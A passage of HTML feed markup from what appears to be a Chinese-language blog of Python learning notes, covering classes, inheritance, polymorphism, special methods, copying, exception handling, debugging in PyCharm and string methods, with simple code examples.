class="hljs-literal">()</span>#Rose <span class="hljs-number">30</span><br></code></pre></td></tr></tbody></table></figure><h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">A</span>(<span class="hljs-symbol">object</span>):<br>    <span class="hljs-symbol">pass</span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">B</span>(<span class="hljs-symbol">object</span>):<br>    <span class="hljs-symbol">pass</span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">C</span>(<span class="hljs-symbol">A,<span class="hljs-symbol">B</span></span>):<br>    <span class="hljs-symbol">pass</span><br></code></pre></td></tr></tbody></table></figure><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>若子类对父类某个属性或方法不满意，可在子类中对其进行重写</p><p>子类重写后的方法可用<code>super().xxx</code>调用父类2中被重写的方法</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name,self.age)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age,num</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name,age)<br>        self.num=num<br>    <span class="hljs-comment">#方法重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().info()<br>        <span class="hljs-built_in">print</span>(self.num)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age,tyear</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name,age)<br>        self.tyear=tyear<br>    <span class="hljs-comment">#方法重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().info()<br>        <span class="hljs-built_in">print</span>(self.tyear)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>,<span class="hljs-string">'1001'</span>)<br>teacher=Teacher(<span class="hljs-string">'Rose'</span>,<span class="hljs-number">30</span>,<span class="hljs-number">10</span>)<br>stu.info()<span class="hljs-comment">#Jack 20 1001</span><br>teacher.info()<span class="hljs-comment">#Rose 30  10</span><br></code></pre></td></tr></tbody></table></figure><h3 id="object类"><a href="#object类" class="headerlink" title="object类"></a>object类</h3><ul><li>是所有类的父类</li><li>内置函数dir()可查看指定对象所有属性</li><li><code>__str__()</code>方法：返回一个对于对象的描述，对应于内置函数str()经常用于print()方法，查看对象信息</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">'我名字是{0},今年{1}岁'</span>.<span class="hljs-built_in">format</span>(self.name,self.age)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(stu))<br><span class="hljs-built_in">print</span>(stu)<span class="hljs-comment">#我名字是Jack,今年20岁</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(stu))<span class="hljs-comment">#&lt;class '__main__.Student'&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>1.不知变量引用类型，仍可以用此变量调用方法，在运行过程中根据变量所用对象类型，动态决定调用哪个对象中的方法。</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-type">def</span> <span class="hljs-title">eat</span>(self):<br>        print(<span class="hljs-string">'动物吃东西'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(Animal):<br>    def eat(self):<br>        print(<span class="hljs-string">'狗吃骨头'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(Animal):<br>    def eat(self):<br>        print(<span class="hljs-string">'猫吃鱼'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-type">def</span> <span class="hljs-title">eat</span>(self):<br>        print(<span class="hljs-string">'人吃饭'</span>)<br>def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(obj)</span></span>:<br>    obj.eat()<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Cat()</span></span>)#猫吃鱼<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Dog()</span></span>)#狗吃骨头<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Animal()</span></span>)#动物吃东西<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Person()</span></span>)#人吃饭<br></code></pre></td></tr></tbody></table></figure><p>2.静态语言与动态语言</p><p>（1）静态语言实现多态的三个必要条件：继承、方法重写、父类引用。指向子类对象。</p><p>（2）动态语言的多态崇尚“鸭子类型”，当看到一只鸟走起来像鸭子，游泳似鸭，收起来也似鸭，那么这只鸟可被称为鸭子。在鸭子类型中，无需关心对象是什么类型，到底是不是鸭子，只关心对象的行为。</p><h2 id="特殊方法和特殊属性"><a href="#特殊方法和特殊属性" class="headerlink" title="特殊方法和特殊属性"></a>特殊方法和特殊属性</h2><h3 id="特殊属性"><a href="#特殊属性" class="headerlink" title="特殊属性"></a>特殊属性</h3><p><code>__dict__</code>获得类对象或者实例对象所绑定的所有属性和方法的字典</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span>(dir(object))<br>class A:<br>    pass<br>class B:<br>    pass<br>class C(A,B):<br>    def __init__(self,name,age):<br>        self.<span class="hljs-attribute">name</span>=name<br>        self.<span class="hljs-attribute">age</span>=age<br><span class="hljs-attribute">x</span>=C('Jack',20)# x为C类的一个实例对象<br><span class="hljs-built_in">print</span>(x.__dict__)#实例对象的属性字典 {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Jack'</span>, <span class="hljs-string">'age'</span>: 20}<br><span class="hljs-built_in">print</span>(C.__dict__)#{<span class="hljs-string">'__module__'</span>: <span class="hljs-string">'__main__'</span>, <span class="hljs-string">'__init__'</span>: &lt;function C.__init__ at 0x000002B51547DC10&gt;, <span class="hljs-string">'__doc__'</span>: None}<br><span class="hljs-built_in">print</span>(x.__class__)#输出了对象所属的类 &lt;class <span class="hljs-string">'__main__.C'</span>&gt;<br><span class="hljs-built_in">print</span>(C.__bases__)#C类的父类类型元素 (&lt;class <span class="hljs-string">'__main__.A'</span>&gt;, &lt;class <span class="hljs-string">'__main__.B'</span>&gt;)<br><span class="hljs-built_in">print</span>(C.__base__)#类的基类 &lt;class <span class="hljs-string">'__main__.A'</span>&gt;<br><span class="hljs-built_in">print</span>(C.__mro__)#类的层次结构 (&lt;class <span class="hljs-string">'__main__.C'</span>&gt;, &lt;class <span class="hljs-string">'__main__.A'</span>&gt;, &lt;class <span class="hljs-string">'__main__.B'</span>&gt;, &lt;class <span class="hljs-string">'object'</span>&gt;)<br><span class="hljs-built_in">print</span>(A.__subclasses__())#子类的列表 [&lt;class <span class="hljs-string">'__main__.C'</span>&gt;]<br></code></pre></td></tr></tbody></table></figure><h3 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h3><ul><li><code>__len__()</code> 通过重写此方法，让len()的参数可以自定义类型</li><li><code>__add__()</code> 通过重写此方法，令自定义对象具有相加的功能</li><li><code>__new__()</code> 创建对象</li><li><code>__init__()</code> 对创建的对象初始化</li></ul><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name</span>):<br>        <span class="hljs-variable language_">self</span>.name=name<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,other</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.name+other.name<br>stu1=Student(<span class="hljs-string">'Jack'</span>)<br>stu2=Student(<span class="hljs-string">'Rose'</span>)<br>s=stu1+stu2<br>print(s)<span class="hljs-comment">#JackRose</span><br>print(stu1.__add__(stu2))<span class="hljs-comment">#JackRose</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__led__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.name)<br>···<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<span class="hljs-comment">#8</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls,*args,**kwargs</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'__new__被调用执行了，cls的id值为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(cls)))<br>        obj=<span class="hljs-built_in">super</span>().__new__(cls)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'创建对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(obj)))<br>        <span class="hljs-keyword">return</span> obj<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'object类对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(<span class="hljs-built_in">object</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'Person类对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(Person)))<br> <span class="hljs-comment">#创建Person类的实例对象</span><br>p1=Person(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'p1这个Person类的实例对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(p1)))<br> <span class="hljs-comment">#object类对象id为140723223092736</span><br> <span class="hljs-comment">#Person类对象id为2976723261008</span><br> <span class="hljs-comment">#__new__被调用执行了，cls的id值为2976723261008</span><br> <span class="hljs-comment">#创建对象id为2976753841488</span><br> <span class="hljs-comment">#p1这个Person类的实例对象id为2976753841488</span><br></code></pre></td></tr></tbody></table></figure><p>解读：</p><ol><li>执行<code>p1=Person()</code>，将值传入class Person中的cls</li><li><strong>new</strong>()创建对西昂obj,传值cls</li><li>obj返回，传入初始化__init__()</li><li>初始化后返回p1</li></ol><h2 id="类的浅拷贝与深拷贝"><a href="#类的浅拷贝与深拷贝" class="headerlink" title="类的浅拷贝与深拷贝"></a>类的浅拷贝与深拷贝</h2><ol><li>变量的赋值操作</li><li>浅拷贝：对象包含的子对象内容不拷贝，因此，源对象与拷贝对象会引用同一个对象</li><li>深拷贝：使用copy模块中的deepcopy函数，递归拷贝对象中包含的子对象，源对象和拷贝对象所有的子对象也不相同。</li></ol><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">class Cpu:<br>    pass<br>class Disk:<br>    pass<br>class Computer:<br>    def __init__(self,cpu,disk):<br>        self.<span class="hljs-attribute">cpu</span>=cpu<br>        self.<span class="hljs-attribute">disk</span>=disk<br> #变量的赋值<br><span class="hljs-attribute">cpu1</span>=Cpu()<br><span class="hljs-attribute">cpu2</span>=cpu1<br><span class="hljs-built_in">print</span>(cpu1,cpu2)<br> #类的浅拷贝<br><span class="hljs-attribute">disk</span>=Disk()<br><span class="hljs-attribute">computer</span>=Computer(cpu1,disk)<br>import copy<br><span class="hljs-attribute">computer2</span>=copy.copy(computer)<br><span class="hljs-built_in">print</span>(computer,computer.cpu,computer.disk)#&lt;__main__.Computer object at 0x000002B5136EFB20&gt;，&lt;__main__.Cpu object at 0x000002B51463B490&gt;，&lt;__main__.Disk object at 0x000002B51463B910&gt;<br><span class="hljs-built_in">print</span>(computer2,computer2.cpu,computer2.disk)#&lt;__main__.Computer object at 0x000002B5148602E0&gt;，&lt;__main__.Cpu object at 0x000002B514860460&gt;，&lt;__main__.Disk object at 0x000002B5148601C0&gt;<br> #只拷贝computer,不拷贝子对象(disk,cpu)<br> #深拷贝<br><span class="hljs-attribute">computer3</span>=copy.deepcopy(computer)<br><span class="hljs-built_in">print</span>(computer3,computer3.cpu,computer3.disk)#&lt;__main__.Computer object at 0x000002B51541C730&gt; &lt;__main__.Cpu object at 0x000002B51541CBE0&gt; &lt;__main__.Disk object at 0x000002B51541C160&gt;<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习7</title>
    <link href="/2022/09/19/python%E5%AD%A6%E4%B9%A07/"/>
    <url>/2022/09/19/python%E5%AD%A6%E4%B9%A07/</url>
    
    <content type="html"><![CDATA[<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>1.常见类型</p><p>(1)语法错误：SyntaxError</p><p>(2)索引越界问题：IndexError</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">lst=<span class="hljs-selector-attr">[1,2,3,4]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst[<span class="hljs-number">4</span>])</span></span><br>l=<span class="hljs-selector-attr">[]</span><br>l=<span class="hljs-built_in">append</span>(<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(l)</span></span><br> #修改：l<span class="hljs-selector-class">.append</span>(<span class="hljs-string">'a'</span>)<br></code></pre></td></tr></tbody></table></figure><p>(3)思路不清导致的问题解决方案</p><ul><li>使用print()</li><li>用<code> #</code>暂时注释代码<br>(4)被动：用户输入错误导致返回错误</li></ul><h1 id="Python异常处理机制"><a href="#Python异常处理机制" class="headerlink" title="Python异常处理机制"></a>Python异常处理机制</h1><p>Python提供了异常处理机制，可以在异常出现时即时捕获。内部消化，令程序继续运行。</p><h2 id="try-…-except-异常类型-……"><a href="#try-…-except-异常类型-……" class="headerlink" title="try:…     except 异常类型:……"></a><code>try:…     except 异常类型:……</code></h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    a=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    b=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    c=a/b<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Sorry,Not is 0'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="多个except结构：try…except…excep…except-BaseException-…"><a href="#多个except结构：try…except…excep…except-BaseException-…" class="headerlink" title="多个except结构：try…except…excep…except BaseException:…"></a>多个except结构：<code>try…except…excep…except BaseException:…</code></h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    a=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    b=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    c=a/b<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Sorry,Not is 0'</span>)<br><span class="hljs-keyword">except</span> ValueError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'input number'</span>)<br><span class="hljs-keyword">except</span> BaseException <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></tbody></table></figure><h2 id="try…except…finally"><a href="#try…except…finally" class="headerlink" title="try…except…finally"></a><code>try…except…finally</code></h2><p>finally无论是否异常都执行，常用于释放try中申请的资源。</p><h2 id="常见异常类型"><a href="#常见异常类型" class="headerlink" title="常见异常类型"></a>常见异常类型</h2><ul><li>ZeroDivisionError ——除零（所有数据类型）</li><li>IndexError ——序列中没有此索引（index）</li><li>KeyError ——映射中没有此链</li><li>NameError ——未声明初始化对象</li><li>SyntaxError ——Python语法错误</li><li>ValueError ——传入无效的参数</li></ul><h2 id="traceback模块"><a href="#traceback模块" class="headerlink" title="traceback模块"></a>traceback模块</h2><p>打印异常信息</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">traceback</span><br><span class="hljs-variable"><span class="hljs-keyword">try</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">except</span></span>:<br>    <span class="hljs-variable">traceback.print_exc</span>()<br></code></pre></td></tr></tbody></table></figure><h1 id="PyCharm开发环境的调试"><a href="#PyCharm开发环境的调试" class="headerlink" title="PyCharm开发环境的调试"></a>PyCharm开发环境的调试</h1><p>1.断点：程序运行到此处暂时挂起，停止执行</p><p>2.调试视图：</p><p>（1）工具栏按钮：运行三角键右侧蜘蛛样式</p><p>（2）右键编辑区：debug’模块名’</p><p>（3）shift+F9</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习6</title>
    <link href="/2022/09/16/python%E5%AD%A6%E4%B9%A06/"/>
    <url>/2022/09/16/python%E5%AD%A6%E4%B9%A06/</url>
    
    <content type="html"><![CDATA[<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>python基本数据类型，不可变字符序列</p><h2 id="驻留机制"><a href="#驻留机制" class="headerlink" title="驻留机制"></a>驻留机制</h2><p>仅保存一份相同且不可变字符串的方法。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-string">'python'</span><br>b=<span class="hljs-string">'python'</span><br>c=<span class="hljs-string">'python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a,id(a)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b,id(b)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c,id(c)</span></span>)<span class="hljs-selector-id">#python</span> <span class="hljs-number">2381469127728</span><br></code></pre></td></tr></tbody></table></figure><p>驻留机制的几种情况（交互模式）</p><ul><li>字符串的长度为0或1时</li><li>符合标识符的字符串</li><li>字符串只在编译时进行驻留，而非运行时</li><li>[-5,256] 之间的整数数字</li></ul><blockquote><p>sys中的intern方法强留2个字符串指向同一个对象；<br>pycharm对字符串进行了优化处理</p></blockquote><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><ul><li>index() 查找子串第一次出现的位置，若不存在返回ValueError</li><li>rindex() 查找子串最后一次出现的位置，若不存在返回ValueError</li><li>find() 查找子串第一次出现的位置，若不存在返回-1</li><li>rfind() 查找子串最后一次出现的位置，若不存在返回-1</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello,hello'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.index(<span class="hljs-string">'lo'</span>)</span></span>) #<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.rindex(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">9</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.find(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.rfind(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">9</span><br></code></pre></td></tr></tbody></table></figure><h3 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h3><ul><li>upper() 所有字母转大写</li><li>lower() 所有字母转小写</li><li>swapcase() 大写转小写，小写转大写</li><li>capitalize() 首字母大写，其余小写</li><li>title() 每个单词首字母大写，剩余字符转小写</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello,Python'</span><br>a=s<span class="hljs-selector-class">.upper</span>()#转后产生新的字符串<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a)</span></span><span class="hljs-selector-id">#HELLO</span>,PYTHON <br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a,id(a)</span></span>) #<span class="hljs-number">1810982406960</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s,id(s)</span></span>) <span class="hljs-selector-id">#hello</span>,Python <span class="hljs-number">1810982405680</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.lower()</span></span>)<span class="hljs-selector-id">#hello</span>,python 转后产生新的字符串<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'------'</span>)</span></span><br>b=s<span class="hljs-selector-class">.lower</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b,id(b)</span></span>) <span class="hljs-selector-id">#hello</span>,python <span class="hljs-number">1810996753072</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s,id(s)</span></span>) <span class="hljs-selector-id">#hello</span>,Python <span class="hljs-number">1810982398768</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b == s)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b is s)</span></span><span class="hljs-selector-id">#False</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'------'</span>)</span></span><br>s2=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.swapcase()</span></span>) <span class="hljs-selector-id">#HELLO</span>,pYTHON<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.title()</span></span>)<span class="hljs-selector-id">#Hello</span>,Python<br></code></pre></td></tr></tbody></table></figure><h3 id="内容对齐"><a href="#内容对齐" class="headerlink" title="内容对齐"></a>内容对齐</h3><ul><li>center() 居中对齐，center([宽度],[填充符])</li><li>ljust 左对齐</li><li>rjust 右对齐</li><li>zfill() 右对齐，左边以0填充，zfill([宽度])</li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-built_in">print</span>(s.center(20,<span class="hljs-string">'*'</span>))#****hello,Python****<br><span class="hljs-built_in">print</span>(s.ljust(20,<span class="hljs-string">'*'</span>))#hello,Python********<br><span class="hljs-built_in">print</span>(s.ljust(10))#hello,Python 宽度小于字符串本身，则返回字符串本身<br><span class="hljs-built_in">print</span>(s.rjust(20,<span class="hljs-string">'*'</span>))#********hello,Python<br><span class="hljs-built_in">print</span>(s.rjust(20))#        hello,Python<br><span 